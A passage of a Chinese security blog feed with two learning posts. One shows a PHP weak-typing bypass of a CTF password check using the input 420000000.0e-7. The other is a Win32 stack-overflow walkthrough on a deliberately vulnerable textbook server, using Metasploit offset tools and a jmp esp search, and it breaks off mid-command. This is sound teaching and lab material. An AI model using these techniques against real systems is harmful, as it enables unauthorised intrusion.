  </entry>
  
  <entry>
    <title>PHP 弱类型带来的安全问题</title>
    <link href="http://sh3ll.me/2015/02/12/php-weak-typing/"/>
    <id>http://sh3ll.me/2015/02/12/php-weak-typing/</id>
    <published>2015-02-12T11:00:26.000Z</published>
    <updated>2016-07-16T09:12:50.038Z</updated>
    
    <content type="html">&lt;p&gt;前一段看到的一个 TIP，实践了下，有所收获。&lt;/p&gt;
&lt;h2 id=&quot;强制转换规则&quot;&gt;&lt;a href=&quot;#强制转换规则&quot; class=&quot;headerlink&quot; title=&quot;强制转换规则&quot;&gt;&lt;/a&gt;强制转换规则&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/2015/02/12/php-weak-typing-1.png&quot; alt=&quot;图 1&quot;&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;字符串转换为数值&quot;&gt;&lt;a href=&quot;#字符串转换为数值&quot; class=&quot;headerlink&quot; title=&quot;字符串转换为数值&quot;&gt;&lt;/a&gt;字符串转换为数值&lt;/h2&gt;&lt;p&gt;由上图可以看出，当对两个字符串进行比较时，会『进行数字或词汇比较』。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;当一个字符串被当作一个数值来取值，其结果和类型如下：&lt;br&gt;如果该字符串没有包含 ‘.’，’e’ 或 ‘E’ 并且其数字值在整型的范围之内（由 PHP_INT_MAX 所定义），该字符串将被当成 integer 来取值。其它所有情况下都被作为 float 来取值。&lt;br&gt;该字符串的开始部分决定了它的值。如果该字符串以合法的数值开始，则使用该数值。否则其值为 0（零）。合法数值由可选的正负号，后面跟着一个或多个数字（可能有小数点），再跟着可选的指数部分。指数部分由 ‘e’ 或 ‘E’ 后面跟着一个或多个数字构成。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;再结合文档，可以得出：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;?php&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    var_dump(&amp;apos;1024&amp;apos; == &amp;apos;1024.00&amp;apos;); //bool(true)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;?&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;实践&quot;&gt;&lt;a href=&quot;#实践&quot; class=&quot;headerlink&quot; title=&quot;实践&quot;&gt;&lt;/a&gt;实践&lt;/h2&gt;&lt;p&gt;微博上看到安全宝发起的 &lt;a href=&quot;http://yuebaomei.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;yuebaomei&lt;/a&gt;，最终关中代码审计运用到了以上 TIP。漏洞代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;?php &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$flag = &amp;quot;THIS IS FLAG&amp;quot;; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;if  (&amp;quot;POST&amp;quot; == $_SERVER[&amp;apos;REQUEST_METHOD&amp;apos;]) &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$password = $_POST[&amp;apos;password&amp;apos;]; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;if (0 &amp;gt;= preg_match(&amp;apos;/^[[:graph:]]&amp;#123;12,&amp;#125;$/&amp;apos;, $password))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;echo &amp;apos;Wrong Format&amp;apos;; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;exit; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;while (TRUE) &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$reg = &amp;apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&amp;apos;; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;if (6 &amp;gt; preg_match_all($reg, $password, $arr)) &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;break; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$c = 0; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$ps = array(&amp;apos;punct&amp;apos;, &amp;apos;digit&amp;apos;, &amp;apos;upper&amp;apos;, &amp;apos;lower&amp;apos;); &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;foreach ($ps as $pt) &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;if (preg_match(&amp;quot;/[[:$pt:]]+/&amp;quot;, $password))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$c += 1;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;if ($c &amp;lt; 3) break; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;if (&amp;quot;42&amp;quot; == $password) echo $flag; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;else echo &amp;apos;Wrong password&amp;apos;; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;exit;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;?&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上面的部分是一些对密码强度的验证，读懂代码后可以简单通过。最后的验证在于：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;if (&amp;quot;42&amp;quot; == $password) echo $flag;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;依照上述思路，令 $password 为 420000000.0e-7 便可通过验证，得到 flag。&lt;/p&gt;
&lt;h2 id=&quot;References-amp-Recommendation&quot;&gt;&lt;a href=&quot;#References-amp-Recommendation&quot; class=&quot;headerlink&quot; title=&quot;References &amp;amp; Recommendation&quot;&gt;&lt;/a&gt;References &amp;amp; Recommendation&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://drops.wooyun.org/tips/4483&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;浅谈PHP弱类型安全&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;前一段看到的一个 TIP，实践了下，有所收获。&lt;/p&gt;
&lt;h2 id=&quot;强制转换规则&quot;&gt;&lt;a href=&quot;#强制转换规则&quot; class=&quot;headerlink&quot; title=&quot;强制转换规则&quot;&gt;&lt;/a&gt;强制转换规则&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/2015/02/12/php-weak-typing-1.png&quot; alt=&quot;图 1&quot;&gt;
    
    </summary>
    
      <category term="Pentest" scheme="http://sh3ll.me/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>栈溢出学习</title>
    <link href="http://sh3ll.me/2014/12/06/stack-overflow/"/>
    <id>http://sh3ll.me/2014/12/06/stack-overflow/</id>
    <published>2014-12-05T17:00:15.000Z</published>
    <updated>2016-07-16T09:12:50.038Z</updated>
    
    <content type="html">&lt;p&gt;暑假实习时和糖果师傅学习了栈溢出，扔了半年，前几天捡起来再次学习一番，纪录笔记如下。&lt;/p&gt;
&lt;h2 id=&quot;基础概念&quot;&gt;&lt;a href=&quot;#基础概念&quot; class=&quot;headerlink&quot; title=&quot;基础概念&quot;&gt;&lt;/a&gt;基础概念&lt;/h2&gt;&lt;p&gt;1.每一个函数独占自己的栈帧空间。当前正在运行的函数的栈帧总是在栈顶。Win32 系统提供两个特殊的寄存器用于标识位于系统栈顶端的栈帧：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ESP：栈指针寄存器，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。&lt;/li&gt;
&lt;li&gt;EBP：基址指针寄存器，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2.在函数栈帧中，一般包含以下几类重要信息：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;局部变量：为函数局部变量开辟的内存空间。&lt;/li&gt;
&lt;li&gt;栈帧状态值：保存前栈帧的顶部和底部（实际上只保存前栈帧的底部，前栈帧的顶部可以通过堆栈平衡计算得到），用于在本帧被弹出后恢复出上一个栈帧。&lt;/li&gt;
&lt;li&gt;函数返回地址：保存当前函数调用前的“断点”信息，也就是函数调用前的指令位置，以便在函数返回时能够恢复到函数被调用钱的代码区中继续执行命令。&lt;/li&gt;
&lt;li&gt;EIP：指令寄存器，其内存放着一个指针，该指针永远指向下一条等待执行的指令地址。可以说如果控制了 EIP 寄存器的内容，就控制了进程 —— 我们让 EIP 指向哪里，CPU 就会去执行哪里的指令。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;3.函数调用大致包括以下几个步骤。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;参数入栈：将参数从右向左依次压入系统栈中。&lt;/li&gt;
&lt;li&gt;返回地址入栈：将当前代码区调用指令的下一条指令地址压入栈中，供函数返回时继续执行。&lt;/li&gt;
&lt;li&gt;代码区跳转：处理器从当前代码区跳转到被调用函数的入口处。&lt;/li&gt;
&lt;li&gt;栈帧调整：具体包括：&lt;ul&gt;
&lt;li&gt;保存当前栈帧状态值，以备后面恢复本栈帧时使用（EBP入栈）&lt;/li&gt;
&lt;li&gt;将当前栈帧切换到新栈帧（将ESP 值装入 EBP，更新栈帧底部）&lt;/li&gt;
&lt;li&gt;给新栈帧分配空间（把 ESP 减去所需空间的大小，抬高栈顶）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;4.按照函数调用约定组织起来的系统栈结构如下：&lt;br&gt;&lt;img src=&quot;/images/2014/12/06/stack-overflow-1.png&quot; alt=&quot;图 1&quot;&gt;&lt;/p&gt;
&lt;p&gt;5.一般情况下，ESP 寄存器中的地址总是指向系统栈中且不会被溢出的数据破坏。函数返回时，ESP 所指的位置恰好时我们所淹没的返回地址的下一个位置（因为 ESP 永远指向系统栈最上面一个栈帧的栈顶）。&lt;/p&gt;
&lt;h2 id=&quot;漏洞代码&quot;&gt;&lt;a href=&quot;#漏洞代码&quot; class=&quot;headerlink&quot; title=&quot;漏洞代码&quot;&gt;&lt;/a&gt;漏洞代码&lt;/h2&gt;&lt;p&gt;测试的漏洞为《0day 安全 软件漏洞分析技术》一书中第 4 章提供的 TCP Server，代码如下：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;59&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;60&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;#include &amp;lt;iostream.h&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;#include &amp;lt;winsock2.h&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;#pragma comment(lib, &amp;quot;ws2_32.lib&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;void msg_display(char * buf)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    char msg[200];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    strcpy(msg, buf); //overflow&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    cout &amp;lt;&amp;lt; &amp;quot;************************************************&amp;quot; &amp;lt;&amp;lt; endl;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    cout &amp;lt;&amp;lt; &amp;quot;received:&amp;quot; &amp;lt;&amp;lt;endl;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    cout &amp;lt;&amp;lt; msg &amp;lt;&amp;lt; endl;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;void main()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    int sock, msgsock, lenth, receive_len;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    struct sockaddr_in sock_server, sock_client;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    char buf[0x200];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    WSADATA wsa;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    WSAStartup(MAKEWORD(1, 1), &amp;amp;wsa);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    if ((sock=socket(AF_INET, SOCK_STREAM, 0))&amp;lt;0)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        cout &amp;lt;&amp;lt; sock &amp;lt;&amp;lt; &amp;quot;sock creating error!&amp;quot; &amp;lt;&amp;lt; endl;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        exit(1);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    sock_server.sin_family = AF_INET;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    sock_server.sin_port = htons(7777);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    sock_server.sin_addr.s_addr = htonl(INADDR_ANY);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    if (bind(sock, (struct sockaddr*)&amp;amp;sock_server, sizeof(sock_server)))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        cout &amp;lt;&amp;lt; &amp;quot;binging stream socket error!&amp;quot; &amp;lt;&amp;lt; endl;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    cout &amp;lt;&amp;lt; &amp;quot;************************************************&amp;quot; &amp;lt;&amp;lt; endl;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    cout &amp;lt;&amp;lt; &amp;quot;           exploit target server 1.0            &amp;quot; &amp;lt;&amp;lt; endl;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    cout &amp;lt;&amp;lt; &amp;quot;************************************************&amp;quot; &amp;lt;&amp;lt; endl;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    listen(sock, 4);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    lenth = sizeof(struct sockaddr);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    do &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        msgsock = accept(sock, (struct sockaddr*)&amp;amp;sock_client, (int*)&amp;amp;lenth);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        if (msgsock == -1)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            cout &amp;lt;&amp;lt; &amp;quot;aaccept error!&amp;quot; &amp;lt;&amp;lt; endl;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            break;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        else&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            do&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                memset(buf, 0, sizeof(buf));&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                if ((receive_len = recv(msgsock, buf, sizeof(buf), 0))&amp;lt;0)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    cout &amp;lt;&amp;lt; &amp;quot;reading stream message erro!&amp;quot; &amp;lt;&amp;lt; endl;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    receive_len = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                msg_display(buf);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#125; while (receive_len);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            closesocket(msgsock);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125; while (1);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    WSACleanup();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;计算溢出长度&quot;&gt;&lt;a href=&quot;#计算溢出长度&quot; class=&quot;headerlink&quot; title=&quot;计算溢出长度&quot;&gt;&lt;/a&gt;计算溢出长度&lt;/h2&gt;&lt;p&gt;使用 metasploit tools 中的&lt;code&gt;pattern_create.rb&lt;/code&gt; 与 &lt;code&gt;pattern_offset.rb&lt;/code&gt; 计算溢出长度。&lt;br&gt;首先生成一个长度为 500 的模版字符串：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;root@sh3ll-me:/opt/metasploit-framework/tools(master○) # ./pattern_create.rb 500&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;发送模版字符串到 TCP Server 后，程序崩溃，纪录其崩溃地址：&lt;br&gt;&lt;img src=&quot;/images/2014/12/06/stack-overflow-2.png&quot; alt=&quot;图 2&quot;&gt;&lt;br&gt;计算其偏移：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;root@sh3ll-me:/opt/metasploit-framework/tools(master○) # ./pattern_offset.rb 0x37674136&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[*] Exact match at offset 200&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;Exploit-It&quot;&gt;&lt;a href=&quot;#Exploit-It&quot; class=&quot;headerlink&quot; title=&quot;Exploit It!&quot;&gt;&lt;/a&gt;Exploit It!&lt;/h2&gt;&lt;p&gt;根据栈结构，可以构造如下的溢出字符串：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;buf(200) + ret(4) + shellcode&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;其中返回地址 ret 用 &lt;code&gt;jmp esp&lt;/code&gt; 的地址覆盖。&lt;/p&gt;
&lt;h4 id=&quot;查找-jmp-esp-地址&quot;&gt;&lt;a href=&quot;#查找-jmp-esp-地址&quot; class=&quot;headerlink&quot; title=&quot;查找 jmp esp 地址&quot;&gt;&lt;/a&gt;查找 &lt;code&gt;jmp esp&lt;/code&gt; 地址&lt;/h4&gt;&lt;p&gt;运行 TCP Server，通过 LoadPE 可以查看出其所加载的所有 dll：&lt;br&gt;&lt;img src=&quot;/images/2014/12/06/stack-overflow-3.png&quot; alt=&quot;图 3&quot;&gt;&lt;br&gt;这里我在 &lt;code&gt;kernel32.dll&lt;/code&gt; 中查找 &lt;code&gt;jmp esp&lt;/code&gt; 地址：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;root@sh3ll-me:/opt/metasploit-framework(master○) # ./msfpescan -j esp /tmp/kernel32.dll &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[/tmp/kernel32.dll]&lt;/div&gt;&lt;div 